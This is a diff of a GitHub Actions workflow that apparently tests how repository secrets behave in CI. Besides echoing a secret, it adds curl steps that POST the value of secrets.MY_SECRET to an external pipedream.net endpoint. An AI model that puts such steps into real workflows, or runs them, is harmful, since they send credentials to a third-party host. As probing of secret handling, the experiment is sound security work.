@@ -33,10 +33,15 @@ jobs:
         run: echo $my_secret
       - name: Show secret 3
         run: echo "${{ env.my_secret }}"
-      - name: Post Secret
+      - name: Post Secret 1
         env:
           my_secret: ${{ secrets.MY_SECRET }}
         run: |
           curl -d "{ \"secret\": \"$my_secret\" }" \
+            -H "Content-Type: application/json" \
+            https://eowrijfoa3qz59z.m.pipedream.net
+      - name: Post Secret 2
+        run: |
+          curl -d "{ \"secret\": \"${{ secrets.MY_SECRET }}\" }" \
             -H "Content-Type: application/json" \
             https://eowrijfoa3qz59z.m.pipedream.net
